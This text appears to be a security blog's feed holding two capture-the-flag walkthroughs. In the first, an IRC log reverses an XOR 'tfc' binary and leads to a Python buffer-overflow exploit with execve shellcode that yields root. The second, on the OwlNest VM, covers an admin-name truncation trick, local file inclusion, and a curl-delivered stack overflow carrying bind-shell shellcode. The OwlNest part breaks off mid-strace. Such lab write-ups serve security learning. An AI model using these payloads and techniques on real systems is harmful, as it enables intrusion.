[2014-10-10T22:47:12+0100] &lt;recrudesce&gt; a1[i]
[2014-10-10T22:47:14+0100] &lt;c0ne&gt; i was worried
[2014-10-10T22:47:31+0100] &lt;c0ne&gt; name that v3 key or so
[2014-10-10T22:47:39+0100] &lt;c0ne&gt; select &gt; n ..
[2014-10-10T22:48:03+0100] &lt;recrudesce&gt; name it to "key" ?
[2014-10-10T22:48:11+0100] &lt;c0ne&gt; yeah or whatever
[2014-10-10T22:48:16+0100] &lt;c0ne&gt; origenaly its called k
[2014-10-10T22:48:16+0100] &lt;recrudesce&gt; ok, done
[2014-10-10T22:48:28+0100] &lt;c0ne&gt; make its sometimes easier to read the whole thing
[2014-10-10T22:48:53+0100] &lt;recrudesce&gt; k is already in use it seems
[2014-10-10T22:49:10+0100] &lt;c0ne&gt; then use key :P
[2014-10-10T22:49:15+0100] &lt;recrudesce&gt; yeah, done it
[2014-10-10T22:49:53+0100] &lt;recrudesce&gt; {
[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;       if ( v3 &amp; 1 )
[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;         v3 = ((unsigned int)v3 &gt;&gt; 1) ^ 0x6DAA1CF4;
[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;       else
[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;         v3 = (unsigned int)v3 &gt;&gt; 1;
[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;     }
[2014-10-10T22:49:53+0100] &lt;recrudesce&gt;   }
[2014-10-10T22:49:59+0100] &lt;c0ne&gt; so with the last bit of code stripped
[2014-10-10T22:50:05+0100] &lt;c0ne&gt; its kinda looks simple right?
[2014-10-10T22:50:08+0100] &lt;recrudesce&gt; yup, that's what i have
[2014-10-10T22:50:34+0100] &lt;c0ne&gt; so for every loop 0..7 it does a math check on the last key value
[2014-10-10T22:50:37+0100] &lt;c0ne&gt; the and 1
[2014-10-10T22:50:50+0100] &lt;c0ne&gt; and so chooses how the mutate the key
[2014-10-10T22:51:28+0100] &lt;c0ne&gt; try porting this into python or what you like
[2014-10-10T22:53:13+0100] &lt;recrudesce&gt; cant i just do this in C and make it echo the keys ?
[2014-10-10T22:53:22+0100] &lt;c0ne&gt; sure
[2014-10-10T22:53:26+0100] &lt;recrudesce&gt; rather than return 0, printf(key) ?
[2014-10-10T22:53:38+0100] &lt;c0ne&gt; but python is just as easy
[2014-10-10T22:53:45+0100] &lt;c0ne&gt; hmm now sure if you want that
[2014-10-10T22:53:51+0100] &lt;c0ne&gt; but yes i think is possible
[2014-10-10T22:54:02+0100] &lt;recrudesce&gt; ok, lets work this through in python
[2014-10-10T22:54:03+0100] &lt;c0ne&gt; but you will flood your screen
[2014-10-10T22:55:32+0100] &lt;recrudesce&gt; ok, so a1 is the content of the file
[2014-10-10T22:55:37+0100] &lt;recrudesce&gt; and a2 is the length of the file ?
[2014-10-10T22:55:38+0100] &lt;c0ne&gt; yes
[2014-10-10T22:55:41+0100] &lt;c0ne&gt; yes
[2014-10-10T22:56:56+0100] &lt;recrudesce&gt; ok, so i need to pass my python script a file
[2014-10-10T22:57:01+0100] &lt;recrudesce&gt; get the contents of it
[2014-10-10T22:57:04+0100] &lt;recrudesce&gt; and the length
[2014-10-10T22:57:56+0100] &lt;c0ne&gt; thats a way indeed
[2014-10-10T22:58:14+0100] &lt;c0ne&gt; easier is to generate the data youself
[2014-10-10T22:58:25+0100] &lt;c0ne&gt; data = 5000 * 'A'
[2014-10-10T22:59:05+0100] &lt;recrudesce&gt; ok, so a1 = 5000 * 'A'
[2014-10-10T22:59:07+0100] &lt;recrudesce&gt; a2 = 5000
[2014-10-10T22:59:19+0100] &lt;recrudesce&gt; key = -367349345
[2014-10-10T22:59:41+0100] &lt;c0ne&gt; go for the signed
[2014-10-10T22:59:47+0100] &lt;c0ne&gt;         key = ((unsigned int)key &gt;&gt; 1) ^ 0x6DAA1CF4;
[2014-10-10T22:59:47+0100] &lt;c0ne&gt;       else
[2014-10-10T22:59:47+0100] &lt;c0ne&gt;         key = (unsigned int)key &gt;&gt; 1;
[2014-10-10T22:59:54+0100] &lt;c0ne&gt; sorry unsigned
[2014-10-10T23:00:02+0100] &lt;c0ne&gt; the code tells you how its intended
[2014-10-10T23:15:14+0100] &lt;recrudesce&gt; so i have
[2014-10-10T23:15:22+0100] &lt;recrudesce&gt; key = 0xEA1AB19F
[2014-10-10T23:15:35+0100] &lt;recrudesce&gt; for i in range (0,a2/4,1) :
[2014-10-10T23:15:44+0100] &lt;recrudesce&gt;      print a1[i] ^ key
[2014-10-10T23:15:48+0100] &lt;recrudesce&gt; throws an error
[2014-10-10T23:15:56+0100] &lt;recrudesce&gt; TypeError: unsupported operand type(s) for ^: 'str' and 'long'
[2014-10-10T23:15:57+0100] &lt;c0ne&gt; yeah of course
[2014-10-10T23:16:02+0100] &lt;c0ne&gt; exactly
[2014-10-10T23:16:02+0100] &lt;recrudesce&gt; so i guess i have to cast key as long ?
[2014-10-10T23:16:07+0100] &lt;c0ne&gt; no
[2014-10-10T23:16:20+0100] &lt;c0ne&gt; your data, you don't treat is a integer
[2014-10-10T23:16:24+0100] &lt;recrudesce&gt; or cast my string as long ?
[2014-10-10T23:16:26+0100] &lt;c0ne&gt; str xor integer
[2014-10-10T23:16:50+0100] &lt;c0ne&gt; struct lib can help you
[2014-10-10T23:17:02+0100] &lt;recrudesce&gt; so i need to work out how to convert my string to an int
[2014-10-10T23:17:08+0100] &lt;recrudesce&gt; convert an A to an int :/
[2014-10-10T23:17:42+0100] &lt;c0ne&gt; x = struct.unpack_from('&lt;L', a1, (i * 4))
[2014-10-10T23:17:43+0100] &lt;c0ne&gt; or so
[2014-10-10T23:17:47+0100] &lt;c0ne&gt; in the loop
[2014-10-10T23:18:22+0100] &lt;recrudesce&gt; &lt;L ?
[2014-10-10T23:18:46+0100] &lt;c0ne&gt; little endian indeed
[2014-10-10T23:19:07+0100] &lt;recrudesce&gt; ok, so now i get tuple and long
[2014-10-10T23:19:21+0100] &lt;c0ne&gt; sorry
[2014-10-10T23:19:22+0100] &lt;recrudesce&gt; rather than string and long :P
[2014-10-10T23:19:25+0100] &lt;c0ne&gt;  x = struct.unpack_from('&lt;L', a1, (i * 4))[0]
[2014-10-10T23:19:27+0100] &lt;c0ne&gt; better
[2014-10-10T23:19:50+0100] &lt;recrudesce&gt; ah ok
[2014-10-10T23:19:52+0100] &lt;recrudesce&gt; cool
[2014-10-10T23:20:06+0100] &lt;c0ne&gt; btw
[2014-10-10T23:20:07+0100] &lt;c0ne&gt; for i in range (0,a2/4,1) :
[2014-10-10T23:20:14+0100] &lt;c0ne&gt; how does this works?
[2014-10-10T23:20:21+0100] &lt;recrudesce&gt; a2 is the length
[2014-10-10T23:20:23+0100] &lt;recrudesce&gt; 0 is start
[2014-10-10T23:20:26+0100] &lt;recrudesce&gt; 1 is step
[2014-10-10T23:20:29+0100] &lt;c0ne&gt; aah ok
[2014-10-10T23:20:34+0100] &lt;recrudesce&gt; so it'll step 1 from 0 to a2/4
[2014-10-10T23:20:43+0100] &lt;c0ne&gt; which is the same as
[2014-10-10T23:20:46+0100] &lt;recrudesce&gt; which is essentially what you're doing with v
[2014-10-10T23:20:47+0100] &lt;recrudesce&gt;  for ( i = 0; a2 &gt;&gt; 2 &gt; i; ++i )
[2014-10-10T23:20:52+0100] &lt;c0ne&gt; range(a2/4)
[2014-10-10T23:20:58+0100] &lt;recrudesce&gt; yeah, could do that too
[2014-10-10T23:21:04+0100] &lt;c0ne&gt; it confused me
[2014-10-10T23:21:57+0100] &lt;recrudesce&gt; if ( key &amp; 1 )
[2014-10-10T23:22:00+0100] &lt;recrudesce&gt; wossat doing ?
[2014-10-10T23:22:22+0100] &lt;c0ne&gt; check a bit is true or false
[2014-10-10T23:22:22+0100] &lt;recrudesce&gt; bitwise and
[2014-10-10T23:23:33+0100] &lt;c0ne&gt; &gt;&gt;&gt; for i in range(10):
[2014-10-10T23:23:34+0100] &lt;c0ne&gt; ...     print (i &amp; 1)
[2014-10-10T23:23:34+0100] &lt;c0ne&gt; ...
[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 0
[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 1
[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 0
[2014-10-10T23:23:34+0100] &lt;c0ne&gt; 1
[2014-10-10T23:23:35+0100] &lt;c0ne&gt; 0
[2014-10-10T23:23:35+0100] &lt;c0ne&gt; 1
[2014-10-10T23:23:36+0100] &lt;c0ne&gt; 0
[2014-10-10T23:23:36+0100] &lt;c0ne&gt; 1
[2014-10-10T23:23:37+0100] &lt;c0ne&gt; 0
[2014-10-10T23:23:37+0100] &lt;c0ne&gt; 1
[2014-10-10T23:28:36+0100] &lt;c0ne&gt; now there where you do
[2014-10-10T23:28:37+0100] &lt;c0ne&gt; print x ^ key
[2014-10-10T23:28:59+0100] &lt;c0ne&gt; you could pack the result into a str again and append it to some output buffer
[2014-10-10T23:29:17+0100] &lt;c0ne&gt; something like
[2014-10-10T23:29:21+0100] &lt;c0ne&gt; outside the loop
[2014-10-10T23:29:24+0100] &lt;c0ne&gt; r = ''
[2014-10-10T23:29:50+0100] &lt;recrudesce&gt; outside which loop - the first or the 2nd ?
[2014-10-10T23:29:52+0100] &lt;c0ne&gt; replace the print with r += struct.pack('&lt;L', (x ^ key))
[2014-10-10T23:30:14+0100] &lt;c0ne&gt; out of the main loop
[2014-10-10T23:30:23+0100] &lt;c0ne&gt; since you have the declare a clean buffer
[2014-10-10T23:30:26+0100] &lt;c0ne&gt; empty
[2014-10-10T23:31:10+0100] &lt;recrudesce&gt; ok, done
[2014-10-10T23:31:18+0100] &lt;recrudesce&gt; then at the end, print r ?
[2014-10-10T23:31:22+0100] &lt;recrudesce&gt; after the entire loop
[2014-10-10T23:31:23+0100] &lt;c0ne&gt; yes
[2014-10-10T23:31:27+0100] &lt;c0ne&gt; or!
[2014-10-10T23:31:42+0100] &lt;c0ne&gt; open('myfile.tfc', 'wb').write( r )
[2014-10-10T23:31:52+0100] &lt;c0ne&gt; so you have it in the file
[2014-10-10T23:32:11+0100] &lt;c0ne&gt; you need it in a file anyways 
[2014-10-10T23:32:26+0100] &lt;recrudesce&gt; ok, i just encrypted 5000 A's
[2014-10-10T23:32:36+0100] &lt;recrudesce&gt; and it looks like it did it
[2014-10-10T23:33:00+0100] &lt;c0ne&gt; feed it to the binary
[2014-10-10T23:33:06+0100] &lt;c0ne&gt; and see what happens
[2014-10-10T23:33:21+0100] &lt;recrudesce&gt; seg fault
[2014-10-10T23:33:32+0100] &lt;c0ne&gt; on..
[2014-10-10T23:34:01+0100] &lt;recrudesce&gt; 0x4f04c41c
[2014-10-10T23:34:14+0100] &lt;c0ne&gt; hmm
[2014-10-10T23:34:21+0100] &lt;c0ne&gt; try 6000 A
[2014-10-10T23:34:25+0100] &lt;c0ne&gt; for a test
[2014-10-10T23:34:41+0100] &lt;c0ne&gt; the original buffer is 4096
[2014-10-10T23:34:50+0100] &lt;c0ne&gt; now that very close to that 5000
[2014-10-10T23:35:26+0100] &lt;c0ne&gt; ooh btw
[2014-10-10T23:35:33+0100] &lt;c0ne&gt; i see a bug in your code
[2014-10-10T23:35:42+0100] &lt;c0ne&gt; for ( j = 0; j &lt;= 7; ++j )
[2014-10-10T23:35:48+0100] &lt;c0ne&gt; 0 ..7 is 8
[2014-10-10T23:35:50+0100] &lt;c0ne&gt; rounds
[2014-10-10T23:35:56+0100] &lt;c0ne&gt; for j in range(7):
[2014-10-10T23:36:00+0100] &lt;c0ne&gt; this is 7 rounds
[2014-10-10T23:36:29+0100] &lt;c0ne&gt; j &lt;= 7
[2014-10-10T23:36:35+0100] &lt;c0ne&gt; less or equal
[2014-10-10T23:36:47+0100] &lt;recrudesce&gt; but it starts at 0
[2014-10-10T23:36:49+0100] &lt;c0ne&gt; if it did j &lt; 7 it would be 7 rounds
[2014-10-10T23:37:07+0100] &lt;recrudesce&gt; so i need to do 6 then
[2014-10-10T23:37:13+0100] &lt;c0ne&gt; no
[2014-10-10T23:37:17+0100] &lt;c0ne&gt; 8
[2014-10-10T23:37:23+0100] &lt;c0ne&gt; for j in range(8)
[2014-10-10T23:37:36+0100] &lt;c0ne&gt; that will go from 0 .. up till 7
[2014-10-10T23:37:40+0100] &lt;c0ne&gt; which is 8 rounds
[2014-10-10T23:37:49+0100] &lt;c0ne&gt; since the 0 counts to
[2014-10-10T23:38:09+0100] &lt;recrudesce&gt; segfault at 41414141
[2014-10-10T23:38:09+0100] &lt;recrudesce&gt; nice
[2014-10-10T23:38:25+0100] &lt;c0ne&gt; now from here on i made it easy
[2014-10-10T23:38:30+0100] &lt;c0ne&gt; exec stack
[2014-10-10T23:38:38+0100] &lt;c0ne&gt; and even added some little helper
[2014-10-10T23:40:14+0100] &lt;recrudesce&gt; so it's one way encryption
[2014-10-10T23:40:19+0100] &lt;recrudesce&gt; but you can encrypt encrypted files to decrypt
[2014-10-10T23:40:23+0100] &lt;recrudesce&gt; hahaha
[2014-10-10T23:40:26+0100] &lt;c0ne&gt; yes
[2014-10-10T23:40:27+0100] &lt;c0ne&gt; xor
[2014-10-10T23:40:36+0100] &lt;c0ne&gt; with a key mutation
[2014-10-10T23:40:53+0100] &lt;c0ne&gt; if i used a static key of for example 16 bytes
[2014-10-10T23:41:06+0100] &lt;c0ne&gt; you could see some pattern in the encrypted data
[2014-10-10T23:41:14+0100] &lt;c0ne&gt; kinda revealing the key
[2014-10-10T23:41:24+0100] &lt;c0ne&gt; so that why added a bit of math
[2014-10-10T23:43:04+0100] &lt;c0ne&gt; you can also make it leak the key
[2014-10-10T23:43:12+0100] &lt;c0ne&gt; feed it a file with 00 bytes
[2014-10-10T23:45:34+0100] &lt;recrudesce&gt; eip is at 4124
[2014-10-10T23:46:29+0100] &lt;c0ne&gt; yes
[2014-10-10T23:48:06+0100] &lt;recrudesce&gt; ok, have control of EIP
[2014-10-10T23:49:35+0100] &lt;c0ne&gt; now whats next ..
[2014-10-10T23:50:04+0100] &lt;recrudesce&gt; ok, so ret2lib i guess ?
[2014-10-10T23:50:13+0100] &lt;c0ne&gt; naah
[2014-10-10T23:50:16+0100] &lt;c0ne&gt; even more simple
[2014-10-10T23:50:29+0100] &lt;c0ne&gt; stack is executable
[2014-10-10T23:50:38+0100] &lt;c0ne&gt; no need for fancy rops
[2014-10-10T23:50:40+0100] &lt;recrudesce&gt; jump to esp
[2014-10-10T23:50:46+0100] &lt;c0ne&gt; yeah
[2014-10-10T23:52:15+0100] &lt;c0ne&gt; msfelfscan -j esp binaryfile
[2014-10-10T23:53:55+0100] &lt;c0ne&gt; asm ("jmp %esp");
[2014-10-10T23:54:00+0100] &lt;c0ne&gt; added it on purpose
[2014-10-10T23:54:06+0100] &lt;c0ne&gt; i'm not that evil
[2014-10-10T23:57:50+0100] &lt;c0ne&gt; since there isnt any more tricks down the way
</code></pre>

<p>So, now that you read that, this is what my Python script looks like</p>

<pre><code class="python">#!/bin/python
import sys
import struct
#a1 = file contents
#a2 = file length

#f = open('input_buff.tfc', 'r')
#a1 = f.read()
#a2 = len(a1)

ret = '\x93\x8e\x04\x08' #08048d93
shellcode = "\xeb\x18\x5e\x31\xc0\x88\x46\x09\x89\x76\x0a\x89\x46\x0e\xb0\x0b\x89\xf3\x8d\x4e\x0a\x8d\x56\x0e\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x64\x61\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"
a1 = 'A'*4124 + ret + '\x90' * 10 + shellcode
l = len(a1) % 4
for m in range(l):
        a1 += 'Z'

a2 = len(a1)

key = 0xEA1AB19F
r=''
# now do the first for loop
for i in range(a2/4):
        x = struct.unpack_from('&lt;L', a1, (i * 4))[0]
        #print x ^ key
        r += struct.pack('&lt;L', (x ^ key))
        for j in range(8):
                if (key &amp; 1):
                        key = (key &gt;&gt; 1) ^ 0x6DAA1Cf4
                else:
                        key = key &gt;&gt; 1
open('myfile.tfc', 'wb').write( r )
</code></pre>

<p>This generates a .tfc file, which when provided to the tfc application &ldquo;decrypts&rdquo;, jumps to esp and executes the shellcode, dropping us to a shell.</p>

<pre><code class="bash">jason@knockknock:~$ python keyshow.py
jason@knockknock:~$ ./tfc ./myfile.tfc ./myfile_blah.tfc
# id
uid=1000(jason) gid=1000(jason) euid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(jason)
# cd /root
# ls -l
total 16
-rw-r--r-- 1 root root 1459 Oct 11 18:04 crpt.py
-rwxr-xr-x 1 root root 1027 Oct 10 18:19 server.py
-rwxr-xr-x 1 root root  119 Sep 26 12:10 start.sh
drwxr-xr-x 2 root root 4096 Oct 10 20:55 the_flag_is_in_here
# cd the_flag_is_in_here
ls -l
# total 4
-rw-r--r-- 1 root root 895 Oct 10 20:55 qQcmDWKM5a6a3wyT.txt
# cat qQcmDWKM5a6a3wyT.txt
 __                         __              __                         __      ____
|  | __ ____   ____   ____ |  | __         |  | __ ____   ____   ____ |  | __ /_   |
|  |/ //    \ /  _ \_/ ___\|  |/ /  ______ |  |/ //    \ /  _ \_/ ___\|  |/ /  |   |
|    &lt;|   |  (  &lt;_&gt; )  \___|    &lt;  /_____/ |    &lt;|   |  (  &lt;_&gt; )  \___|    &lt;   |   |
|__|_ \___|  /\____/ \___  &gt;__|_ \         |__|_ \___|  /\____/ \___  &gt;__|_ \  |___|
     \/    \/            \/     \/              \/    \/            \/     \/       

Hooray you got the flag!

Hope you had as much fun r00ting this as I did making it!

Feel free to hit me up in #vulnhub @ zer0w1re

Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM :)

root password is "qVx4UJ*zcUdc9#3C$Q", but you should already have a shell, right? ;)
#
</code></pre>

<p><img src="http://halloffamejay.com/wp-content/uploads/2013/10/muppet.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Owl Up In My Grill]]></title>
    <link href="http://recrudesce.github.io/2014/10/26/owl-up-in-my-grill/"/>
    <updated>2014-10-26T17:16:50+00:00</updated>
    <id>http://recrudesce.github.io/2014/10/26/owl-up-in-my-grill</id>
    <content type="html"><![CDATA[<p>So, while we were all sitting in #vulnhub (on Freenode) waiting for <a href="https://twitter.com/superkojiman">superkojiman</a> to release Persistence, <a href="https://twitter.com/swappage">Swappage</a> released <a href="vulnhub.com/entry/owlnest-102,102/">OwlNest</a>. I thought, what the hell, might as well use it to pass the time, right ? I was, however, not expecting it to take me 4 days&hellip;</p>

<!-- more -->


<h2>Were You Born in a Barn (Owl) ?</h2>

<p>A quick dig around using NMAP</p>

<pre><code class="bash">root@pwk:/var/www# nmap -sS -O -p1-65535 --script banner 172.16.56.131 -P0

Starting Nmap 6.47 ( http://nmap.org ) at 2014-09-01 22:49 BST
Nmap scan report for 172.16.56.131
Host is up (0.00034s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
|_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
80/tcp    open  http
111/tcp   open  rpcbind
31337/tcp open  Elite
| banner: (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)\x0D\x
|_0A        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\\...
34895/tcp open  unknown
MAC Address: 00:0C:29:9A:51:B8 (VMware)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.2 - 3.10
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.87 seconds
root@pwk:/var/www#
</code></pre>

<p>Looks like there&rsquo;s a banner on port 31337, might as well get all of it, and see if the service behind it is vulnerable to format string.</p>

<pre><code class="bash">root@pwk:/var/www# nc -nv 172.16.56.131 31337
nc: 172.16.56.131 31337 open
        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

This is the OwlNest Administration console

Type Help for a list of available commands.

Ready: %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%Ss
Ready: help

Syntax: command &lt;argument&gt;

help         This help
username     Specify your login name
password     Specify your password
privs    Specify your access level
login        login to shell with specified username and password

Ready:
</code></pre>

<p>This looks like something we&rsquo;ll need a username and password for. As none are known, this port is being ignored for now. Port 80&rsquo;s where it&rsquo;s at then.</p>

<p><a href="/images/owlnest_001.png"><img src="/images/owlnest_001.png" alt="owlnest_001" /></a></p>

<p>The Register link allows us to create a new user, which we can use to log in and look around</p>

<p><a href="/images/owlnest_002.png"><img src="/images/owlnest_002.png" alt="owlnest_002" /></a></p>

<p>But it seems we&rsquo;re not allowed to use the Upload feature, because we&rsquo;re not &ldquo;admin&rdquo;. An interesting point to note here is that the URL for the Upload feature is <a href="http://172.16.56.131/uploadform.php?page=forms/form.php,">http://172.16.56.131/uploadform.php?page=forms/form.php,</a> which means we could possibly leverage it for LFI. No other links on the site work in this way.</p>

<p>Looking at the source for the registration page, it seems the username is capped at 16 characters.</p>

<p>&#8220;` html</p>

<div class="form-group">
                <label for="nome" class="col-sm-2 col-lg-2 control-label">Login Name:</label>
                <div class="col-sm-5 col-lg-5">
                    <input type="text" class="form-control" maxlength="16" name="username" id="username" placeholder="Choose a Login name...">
                </div>
            </div>


<pre><code>
Could we cheat the system and register a user with the name "admin" and then add 11 spaces after it plus a random character ? We can assume that the registration form will truncate any characters over 16. Tamper data is our friend here - the form can be filled in with the username of "admin" and then intercepted with Tamper data (or Burp, if you want) to modify the username POST variable to "admin           a" and submitted.

[![owlnest_003](/images/owlnest_003.png)](/images/owlnest_003.png)

[![owlnest_004](/images/owlnest_004.png)](/images/owlnest_004.png)

[![owlnest_005](/images/owlnest_005.png)](/images/owlnest_005.png)

Once this malicious user is created, it is possible to then log in with the username of "admin" and the password we set for "admin           a".

[![owlnest_006](/images/owlnest_006.png)](/images/owlnest_006.png)

Which allows access to the Upload feature (not that we're going to use it for it's intended use)

[![owlnest_007](/images/owlnest_007.png)](/images/owlnest_007.png)

* * *

## This is a Hoot !

The upload form posts to /application/upload
</code></pre>

<p><form class="form-horizontal" method="POST" enctype="multipart/form-data" action="/application/upload">
&#8220;`</p>

<p>Which when called with no arguments shows the following</p>

<p><a href="/images/owlnest_008.png"><img src="/images/owlnest_008.png" alt="owlnest_008" /></a></p>

<p>It is possible to browse to the application folder, which shows that the application is actually 601kb - a bit much just to parse an upload form.</p>

<p><a href="/images/owlnest_009.png"><img src="/images/owlnest_009.png" alt="owlnest_009" /></a></p>

<h2>Owls Well That Ends Well</h2>

<p>The uploadform.php page can be used to provide us with a base64 encoded copy of the upload binary, which means it will not be parsed or executed.</p>

<p><a href="/images/owlnest_010.png"><img src="/images/owlnest_010.png" alt="owlnest_010" /></a></p>

<p>With the binary now available offline, we can go about working out what it does. It&rsquo;s a CGI binary, so we can interact with it via the command line using the QUERY_STRING environment value. Lets set something really simple first. I&rsquo;ve purposefully not included any GDB stuff here, as an excuse for you to work it out and learn :)</p>

<pre><code class="bash">root@pwk:~# export QUERY_STRING="name=Me&amp;surname=Me&amp;Description=Me2&amp;uploadfield=Blah&amp;email=me@me.com"
root@pwk:~# ./owlbin
Content-type: text/plain

Unable to open file
root@pwk:~#
</code></pre>

<p>It is possible to overflow this application via the email variable, which through some further investigation identifies that EIP is at offset 277.</p>

<pre><code class="bash">root@pwk:~# export QUERY_STRING=$(python -c 'print "uploadfield=/etc/passwd&amp;uploadfield=bleh99&amp;name=Me&amp;email=AAH@" + "A"*276+"BBBB"')
root@pwk:~# ./owlbin
Content-type: text/plain

Segmentation fault
root@pwk:~#
</code></pre>

<p>gdb-peda can be used to find a jmp esp call, which is at 0x80c75ab9. This is what we&rsquo;ll set our EIP value to, which should hopefully jump to our bind shell shellcode. This can be completely exploited as follows</p>

<pre><code class="bash">root@pwk:~# export QUERY_STRING=$(python -c 'print "uploadfield=/etc/passwd&amp;uploadfield=passwd&amp;name=Russ&amp;email=AAH@" + "A"*276+"\xab\x75\x0c\x08" + "\x90\x90\x90\x90\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80"')
root@pwk:~# curl -v "http://172.16.56.140/application/upload" --data "$QUERY_STRING"
* About to connect() to 172.16.56.140 port 80 (#0)
*   Trying 172.16.56.140...
* connected
* Connected to 172.16.56.140 (172.16.56.140) port 80 (#0)
&gt; POST /application/upload HTTP/1.1
&gt; User-Agent: curl/7.26.0
&gt; Host: 172.16.56.140
&gt; Accept: */*
&gt; Content-Length: 436
&gt; Content-Type: application/x-www-form-urlencoded
&gt;
* upload completely sent off: 436 out of 436 bytes
root@pwk:~# nc -nv 172.16.56.140 1337
nc: 172.16.56.140 1337 open
id
uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
</code></pre>

<p>Once a public key is added to authorized_hosts, we can SSH in and obtain a full TTY shell.</p>

<pre><code class="bash">$ ssh rmp@172.16.56.131
The authenticity of host '172.16.56.131 (172.16.56.131)' can't be established.
RSA key fingerprint is c0:f8:4e:c6:f9:28:14:5b:c3:ed:8a:00:51:aa:82:d5.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.16.56.131' (RSA) to the list of known hosts.
Linux owlnest 3.2.0-4-686-pae #1 SMP Debian 3.2.60-1+deb7u3 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
rmp@owlnest:~$ id
uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
rmp@owlnest:~$
</code></pre>

<p>There&rsquo;s one application available in /home/rmp, and that&rsquo;s the application that is listening on port 31337 (the one that requested username and password etc).</p>

<pre><code class="bash">rmp@owlnest:~$ ls -l
total 588
-rwx------ 1 rmp rmp 599275 Aug 11 13:35 adminconsole
rmp@owlnest:~$
</code></pre>

<p>which when straced, shows that it is reading /root/password.txt to check the provided credentials.</p>

<pre><code class="bash">root@pwk:~# strace ./adminconsole
execve("./adminconsole", ["./adminconsole"], [/* 19 vars */]) = 0
uname({sys="Linux", node="pwk", ...})   = 0
brk(0)                                  = 0x9407000
brk(0x9407cd0)                          = 0x9407cd0
set_thread_area({entry_number:-1 -&gt; 6, base_addr:0x9407830, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
brk(0x9428cd0)                          = 0x9428cd0
brk(0x9429000)                          = 0x9429000
fstat64(1, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775e000
write(1, "        (\\___/)   (\\___/)   (\\__"..., 67        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
) = 67
write(1, "        /0\\ /0\\   /o\\ /o\\   /0\\ "..., 67        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
) = 67
write(1, "        \\__V__/   \\__V__/   \\__V"..., 67        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
) = 67
write(1, "       /|:. .:|\\ /|;, ,;|\\ /|:. "..., 68       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
) = 68
write(1, "       \\\\:::::// \\\\;;;;;// \\\\:::"..., 68       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
) = 68
write(1, "   -----`\"\" \"\"`---`\"\" \"\"`---`\"\" "..., 70   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
) = 70
write(1, "        \\__V__/   \\__V__/   \\__V"..., 69        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

) = 69
write(1, "This is the OwlNest Administrati"..., 46This is the OwlNest Administration console

) = 46
write(1, "Type Help for a list of availabl"..., 47Type Help for a list of available commands.

) = 47
write(1, "Ready: ", 7Ready: )                  = 7
fstat64(0, {st_mode=S_IFCHR|0600, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb775d000
read(0, username root
"username root\n", 1024)        = 14
write(1, "Ready: ", 7Ready: )                  = 7
